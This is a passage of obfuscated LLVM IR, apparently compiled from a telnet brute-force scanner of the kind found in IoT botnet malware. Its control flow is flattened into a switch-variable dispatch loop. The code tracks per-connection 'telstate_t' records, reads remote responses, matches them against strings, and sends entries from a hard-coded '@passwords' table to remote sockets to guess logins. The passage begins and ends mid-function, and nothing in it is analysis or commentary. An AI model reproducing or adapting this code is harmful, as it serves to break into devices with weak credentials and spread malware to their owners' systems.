  %.reload276 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload276, i64 %891
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %892, i32 0, i32 7
  %894 = load i16, i16* %893, align 16
  %895 = zext i16 %894 to i32
  %896 = call i32 @readUntil(i32 %884, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %889, i32 1024, i32 %895)
  %897 = icmp ne i32 %896, 0
  %898 = select i1 %897, i32 -411445407, i32 1454474510
  store i32 %898, i32* %switchVar
  br label %loopEnd

; <label>:899:                                    ; preds = %loopEntry
  %900 = load i32, i32* %2, align 4
  %901 = sext i32 %900 to i64
  %.reload275 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload275, i64 %901
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %902, i32 0, i32 6
  store i32 0, i32* %903, align 4
  %904 = load i32, i32* %2, align 4
  %905 = sext i32 %904 to i64
  %.reload274 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload274, i64 %905
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %906, i32 0, i32 7
  store i16 0, i16* %907, align 16
  %908 = load i32, i32* %2, align 4
  %909 = sext i32 %908 to i64
  %.reload273 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload273, i64 %909
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %910, i32 0, i32 8
  %912 = load i8*, i8** %911, align 8
  %913 = call i8* @strstr(i8* %912, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0)) #10
  %914 = icmp ne i8* %913, null
  %915 = select i1 %914, i32 -930754493, i32 -1554863868
  store i32 %915, i32* %switchVar
  br label %loopEnd

; <label>:916:                                    ; preds = %loopEntry
  %917 = load i32, i32* %2, align 4
  %918 = sext i32 %917 to i64
  %.reload272 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload272, i64 %918
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %919, i32 0, i32 2
  store i8 5, i8* %920, align 8
  store i32 2008045643, i32* %switchVar
  br label %loopEnd

; <label>:921:                                    ; preds = %loopEntry
  %922 = load i32, i32* %2, align 4
  %923 = sext i32 %922 to i64
  %.reload271 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload271, i64 %923
  %925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %924, i32 0, i32 2
  store i8 7, i8* %925, align 8
  store i32 2008045643, i32* %switchVar
  br label %loopEnd

; <label>:926:                                    ; preds = %loopEntry
  %927 = load i32, i32* %2, align 4
  %928 = sext i32 %927 to i64
  %.reload270 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload270, i64 %928
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %929, i32 0, i32 8
  %931 = load i8*, i8** %930, align 8
  call void @llvm.memset.p0i8.i64(i8* %931, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:932:                                    ; preds = %loopEntry
  %933 = load i32, i32* %2, align 4
  %934 = sext i32 %933 to i64
  %.reload269 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload269, i64 %934
  %936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %935, i32 0, i32 8
  %937 = load i8*, i8** %936, align 8
  %938 = call i8* @strstr(i8* %937, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.63, i32 0, i32 0)) #10
  %939 = icmp ne i8* %938, null
  %940 = select i1 %939, i32 320516803, i32 1287666271
  store i32 %940, i32* %switchVar
  br label %loopEnd

; <label>:941:                                    ; preds = %loopEntry
  %942 = load i32, i32* %2, align 4
  %943 = sext i32 %942 to i64
  %.reload268 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %944 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload268, i64 %943
  %945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %944, i32 0, i32 0
  %946 = load i32, i32* %945, align 16
  %947 = call i32 @sclose(i32 %946)
  %948 = load i32, i32* %2, align 4
  %949 = sext i32 %948 to i64
  %.reload267 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload267, i64 %949
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %950, i32 0, i32 2
  store i8 0, i8* %951, align 8
  %952 = load i32, i32* %2, align 4
  %953 = sext i32 %952 to i64
  %.reload266 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload266, i64 %953
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %954, i32 0, i32 3
  store i8 0, i8* %955, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:956:                                    ; preds = %loopEntry
  %957 = load i32, i32* %2, align 4
  %958 = sext i32 %957 to i64
  %.reload265 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload265, i64 %958
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %959, i32 0, i32 8
  %961 = load i8*, i8** %960, align 8
  %962 = call i8* @strstr(i8* %961, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.64, i32 0, i32 0)) #10
  %963 = icmp ne i8* %962, null
  %964 = select i1 %963, i32 1393891403, i32 -765212361
  store i32 %964, i32* %switchVar
  br label %loopEnd

; <label>:965:                                    ; preds = %loopEntry
  %966 = load i32, i32* %2, align 4
  %967 = sext i32 %966 to i64
  %.reload264 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload264, i64 %967
  %969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %968, i32 0, i32 0
  %970 = load i32, i32* %969, align 16
  %971 = call i32 @sclose(i32 %970)
  %972 = load i32, i32* %2, align 4
  %973 = sext i32 %972 to i64
  %.reload263 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload263, i64 %973
  %975 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %974, i32 0, i32 2
  store i8 0, i8* %975, align 8
  %976 = load i32, i32* %2, align 4
  %977 = sext i32 %976 to i64
  %.reload262 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload262, i64 %977
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %978, i32 0, i32 3
  store i8 0, i8* %979, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:980:                                    ; preds = %loopEntry
  %981 = load i32, i32* %2, align 4
  %982 = sext i32 %981 to i64
  %.reload261 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload261, i64 %982
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %983, i32 0, i32 8
  %985 = load i8*, i8** %984, align 8
  %986 = call i8* @strstr(i8* %985, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0)) #10
  %987 = icmp ne i8* %986, null
  %988 = select i1 %987, i32 -323724753, i32 2045847866
  store i32 %988, i32* %switchVar
  br label %loopEnd

; <label>:989:                                    ; preds = %loopEntry
  %990 = load i32, i32* %2, align 4
  %991 = sext i32 %990 to i64
  %.reload260 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload260, i64 %991
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %992, i32 0, i32 0
  %994 = load i32, i32* %993, align 16
  %995 = call i32 @sclose(i32 %994)
  %996 = load i32, i32* %2, align 4
  %997 = sext i32 %996 to i64
  %.reload259 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload259, i64 %997
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %998, i32 0, i32 2
  store i8 0, i8* %999, align 8
  %1000 = load i32, i32* %2, align 4
  %1001 = sext i32 %1000 to i64
  %.reload258 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload258, i64 %1001
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1002, i32 0, i32 3
  store i8 0, i8* %1003, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1004:                                   ; preds = %loopEntry
  %1005 = load i32, i32* %2, align 4
  %1006 = sext i32 %1005 to i64
  %.reload257 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload257, i64 %1006
  %1008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1007, i32 0, i32 8
  %1009 = load i8*, i8** %1008, align 8
  %1010 = call i8* @strstr(i8* %1009, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %1011 = icmp ne i8* %1010, null
  %1012 = select i1 %1011, i32 758617630, i32 924392342
  store i32 %1012, i32* %switchVar
  br label %loopEnd

; <label>:1013:                                   ; preds = %loopEntry
  %1014 = load i32, i32* %2, align 4
  %1015 = sext i32 %1014 to i64
  %.reload256 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload256, i64 %1015
  %1017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1016, i32 0, i32 0
  %1018 = load i32, i32* %1017, align 16
  %1019 = call i32 @sclose(i32 %1018)
  %1020 = load i32, i32* %2, align 4
  %1021 = sext i32 %1020 to i64
  %.reload255 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload255, i64 %1021
  %1023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1022, i32 0, i32 2
  store i8 0, i8* %1023, align 8
  %1024 = load i32, i32* %2, align 4
  %1025 = sext i32 %1024 to i64
  %.reload254 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload254, i64 %1025
  %1027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1026, i32 0, i32 3
  store i8 0, i8* %1027, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1028:                                   ; preds = %loopEntry
  %1029 = load i32, i32* %2, align 4
  %1030 = sext i32 %1029 to i64
  %.reload253 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload253, i64 %1030
  %1032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1031, i32 0, i32 8
  %1033 = load i8*, i8** %1032, align 8
  %1034 = call i8* @strstr(i8* %1033, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %1035 = icmp ne i8* %1034, null
  %1036 = select i1 %1035, i32 1281586438, i32 -1969233801
  store i32 %1036, i32* %switchVar
  br label %loopEnd

; <label>:1037:                                   ; preds = %loopEntry
  %1038 = load i32, i32* %2, align 4
  %1039 = sext i32 %1038 to i64
  %.reload252 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload252, i64 %1039
  %1041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1040, i32 0, i32 0
  %1042 = load i32, i32* %1041, align 16
  %1043 = call i32 @sclose(i32 %1042)
  %1044 = load i32, i32* %2, align 4
  %1045 = sext i32 %1044 to i64
  %.reload251 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload251, i64 %1045
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1046, i32 0, i32 2
  store i8 0, i8* %1047, align 8
  %1048 = load i32, i32* %2, align 4
  %1049 = sext i32 %1048 to i64
  %.reload250 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload250, i64 %1049
  %1051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1050, i32 0, i32 3
  store i8 0, i8* %1051, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1052:                                   ; preds = %loopEntry
  %1053 = load i32, i32* %2, align 4
  %1054 = sext i32 %1053 to i64
  %.reload249 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload249, i64 %1054
  %1056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1055, i32 0, i32 8
  %1057 = load i8*, i8** %1056, align 8
  %1058 = call i8* @strstr(i8* %1057, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1059 = icmp ne i8* %1058, null
  %1060 = select i1 %1059, i32 419578374, i32 -291159724
  store i32 %1060, i32* %switchVar
  br label %loopEnd

; <label>:1061:                                   ; preds = %loopEntry
  %1062 = load i32, i32* %2, align 4
  %1063 = sext i32 %1062 to i64
  %.reload248 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1064 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload248, i64 %1063
  %1065 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1064, i32 0, i32 0
  %1066 = load i32, i32* %1065, align 16
  %1067 = call i32 @sclose(i32 %1066)
  %1068 = load i32, i32* %2, align 4
  %1069 = sext i32 %1068 to i64
  %.reload247 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload247, i64 %1069
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1070, i32 0, i32 2
  store i8 0, i8* %1071, align 8
  %1072 = load i32, i32* %2, align 4
  %1073 = sext i32 %1072 to i64
  %.reload246 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload246, i64 %1073
  %1075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1074, i32 0, i32 3
  store i8 0, i8* %1075, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1076:                                   ; preds = %loopEntry
  %1077 = load i32, i32* %2, align 4
  %1078 = sext i32 %1077 to i64
  %.reload245 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1079 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload245, i64 %1078
  %1080 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1079, i32 0, i32 8
  %1081 = load i8*, i8** %1080, align 8
  %1082 = call i8* @strstr(i8* %1081, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1083 = icmp ne i8* %1082, null
  %1084 = select i1 %1083, i32 -1338295844, i32 46139568
  store i32 %1084, i32* %switchVar
  br label %loopEnd

; <label>:1085:                                   ; preds = %loopEntry
  %1086 = load i32, i32* %2, align 4
  %1087 = sext i32 %1086 to i64
  %.reload244 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload244, i64 %1087
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1088, i32 0, i32 0
  %1090 = load i32, i32* %1089, align 16
  %1091 = call i32 @sclose(i32 %1090)
  %1092 = load i32, i32* %2, align 4
  %1093 = sext i32 %1092 to i64
  %.reload243 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload243, i64 %1093
  %1095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1094, i32 0, i32 2
  store i8 0, i8* %1095, align 8
  %1096 = load i32, i32* %2, align 4
  %1097 = sext i32 %1096 to i64
  %.reload242 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload242, i64 %1097
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1098, i32 0, i32 3
  store i8 0, i8* %1099, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1100:                                   ; preds = %loopEntry
  %1101 = load i32, i32* %2, align 4
  %1102 = sext i32 %1101 to i64
  %.reload241 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload241, i64 %1102
  %1104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1103, i32 0, i32 8
  %1105 = load i8*, i8** %1104, align 8
  %1106 = call i8* @strstr(i8* %1105, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1107 = icmp ne i8* %1106, null
  %1108 = select i1 %1107, i32 333499587, i32 1354000359
  store i32 %1108, i32* %switchVar
  br label %loopEnd

; <label>:1109:                                   ; preds = %loopEntry
  %1110 = load i32, i32* %2, align 4
  %1111 = sext i32 %1110 to i64
  %.reload240 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload240, i64 %1111
  %1113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1112, i32 0, i32 0
  %1114 = load i32, i32* %1113, align 16
  %1115 = call i32 @sclose(i32 %1114)
  %1116 = load i32, i32* %2, align 4
  %1117 = sext i32 %1116 to i64
  %.reload239 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload239, i64 %1117
  %1119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1118, i32 0, i32 2
  store i8 0, i8* %1119, align 8
  %1120 = load i32, i32* %2, align 4
  %1121 = sext i32 %1120 to i64
  %.reload238 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload238, i64 %1121
  %1123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1122, i32 0, i32 3
  store i8 0, i8* %1123, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1124:                                   ; preds = %loopEntry
  %1125 = load i32, i32* %2, align 4
  %1126 = sext i32 %1125 to i64
  %.reload237 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload237, i64 %1126
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1127, i32 0, i32 8
  %1129 = load i8*, i8** %1128, align 8
  %1130 = call i8* @strstr(i8* %1129, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1131 = icmp ne i8* %1130, null
  %1132 = select i1 %1131, i32 1492503634, i32 -1624474035
  store i32 %1132, i32* %switchVar
  br label %loopEnd

; <label>:1133:                                   ; preds = %loopEntry
  %1134 = load i32, i32* %2, align 4
  %1135 = sext i32 %1134 to i64
  %.reload236 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload236, i64 %1135
  %1137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1136, i32 0, i32 0
  %1138 = load i32, i32* %1137, align 16
  %1139 = call i32 @sclose(i32 %1138)
  %1140 = load i32, i32* %2, align 4
  %1141 = sext i32 %1140 to i64
  %.reload235 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload235, i64 %1141
  %1143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1142, i32 0, i32 2
  store i8 0, i8* %1143, align 8
  %1144 = load i32, i32* %2, align 4
  %1145 = sext i32 %1144 to i64
  %.reload234 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload234, i64 %1145
  %1147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1146, i32 0, i32 3
  store i8 0, i8* %1147, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1148:                                   ; preds = %loopEntry
  %1149 = load i32, i32* %2, align 4
  %1150 = sext i32 %1149 to i64
  %.reload233 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload233, i64 %1150
  %1152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1151, i32 0, i32 8
  %1153 = load i8*, i8** %1152, align 8
  %1154 = call i64 @strlen(i8* %1153) #10
  %1155 = trunc i64 %1154 to i16
  %1156 = load i32, i32* %2, align 4
  %1157 = sext i32 %1156 to i64
  %.reload232 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload232, i64 %1157
  %1159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1158, i32 0, i32 7
  store i16 %1155, i16* %1159, align 16
  store i32 696163375, i32* %switchVar
  br label %loopEnd

; <label>:1160:                                   ; preds = %loopEntry
  %1161 = load i32, i32* %2, align 4
  %1162 = sext i32 %1161 to i64
  %.reload231 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload231, i64 %1162
  %1164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1163, i32 0, i32 6
  %1165 = load i32, i32* %1164, align 4
  %1166 = add i32 %1165, 10
  %1167 = zext i32 %1166 to i64
  %1168 = call i64 @time(i64* null) #2
  %1169 = icmp slt i64 %1167, %1168
  %1170 = select i1 %1169, i32 1122747494, i32 -1345848622
  store i32 %1170, i32* %switchVar
  br label %loopEnd

; <label>:1171:                                   ; preds = %loopEntry
  %1172 = load i32, i32* %2, align 4
  %1173 = sext i32 %1172 to i64
  %.reload230 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload230, i64 %1173
  %1175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1174, i32 0, i32 0
  %1176 = load i32, i32* %1175, align 16
  %1177 = call i32 @sclose(i32 %1176)
  %1178 = load i32, i32* %2, align 4
  %1179 = sext i32 %1178 to i64
  %.reload229 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload229, i64 %1179
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1180, i32 0, i32 2
  store i8 0, i8* %1181, align 8
  %1182 = load i32, i32* %2, align 4
  %1183 = sext i32 %1182 to i64
  %.reload228 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload228, i64 %1183
  %1185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1184, i32 0, i32 3
  store i8 1, i8* %1185, align 1
  store i32 -1345848622, i32* %switchVar
  br label %loopEnd

; <label>:1186:                                   ; preds = %loopEntry
  store i32 1068643273, i32* %switchVar
  br label %loopEnd

; <label>:1187:                                   ; preds = %loopEntry
  %1188 = load i32, i32* %2, align 4
  %1189 = sext i32 %1188 to i64
  %.reload227 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload227, i64 %1189
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1190, i32 0, i32 0
  %1192 = load i32, i32* %1191, align 16
  %1193 = load i32, i32* %2, align 4
  %1194 = sext i32 %1193 to i64
  %.reload226 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload226, i64 %1194
  %1196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1195, i32 0, i32 5
  %1197 = load i8, i8* %1196, align 1
  %1198 = zext i8 %1197 to i64
  %1199 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1198
  %1200 = load i8*, i8** %1199, align 8
  %1201 = load i32, i32* %2, align 4
  %1202 = sext i32 %1201 to i64
  %.reload225 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload225, i64 %1202
  %1204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1203, i32 0, i32 5
  %1205 = load i8, i8* %1204, align 1
  %1206 = zext i8 %1205 to i64
  %1207 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %1206
  %1208 = load i8*, i8** %1207, align 8
  %1209 = call i64 @strlen(i8* %1208) #10
  %1210 = call i64 @send(i32 %1192, i8* %1200, i64 %1209, i32 16384)
  %1211 = icmp slt i64 %1210, 0
  %1212 = select i1 %1211, i32 -47844031, i32 1776159521
  store i32 %1212, i32* %switchVar
  br label %loopEnd

; <label>:1213:                                   ; preds = %loopEntry
  %1214 = load i32, i32* %2, align 4
  %1215 = sext i32 %1214 to i64
  %.reload224 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload224, i64 %1215
  %1217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1216, i32 0, i32 0
  %1218 = load i32, i32* %1217, align 16
  %1219 = call i32 @sclose(i32 %1218)
  %1220 = load i32, i32* %2, align 4
  %1221 = sext i32 %1220 to i64
  %.reload223 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload223, i64 %1221
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1222, i32 0, i32 2
  store i8 0, i8* %1223, align 8
  %1224 = load i32, i32* %2, align 4
  %1225 = sext i32 %1224 to i64
  %.reload222 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload222, i64 %1225
  %1227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1226, i32 0, i32 3
  store i8 1, i8* %1227, align 1
  store i32 -1653477229, i32* %switchVar
  br label %loopEnd

; <label>:1228:                                   ; preds = %loopEntry
  %1229 = load i32, i32* %2, align 4
  %1230 = sext i32 %1229 to i64
  %.reload221 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload221, i64 %1230
  %1232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1231, i32 0, i32 0
  %1233 = load i32, i32* %1232, align 16
  %1234 = call i64 @send(i32 %1233, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %1235 = icmp slt i64 %1234, 0
  %1236 = select i1 %1235, i32 534600445, i32 -943112738
  store i32 %1236, i32* %switchVar
  br label %loopEnd

; <label>:1237:                                   ; preds = %loopEntry
  %1238 = load i32, i32* %2, align 4
  %1239 = sext i32 %1238 to i64
  %.reload220 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload220, i64 %1239
  %1241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1240, i32 0, i32 0
  %1242 = load i32, i32* %1241, align 16
  %1243 = call i32 @sclose(i32 %1242)
  %1244 = load i32, i32* %2, align 4
  %1245 = sext i32 %1244 to i64
  %.reload219 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem26
  %1246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload219, i64 %1245
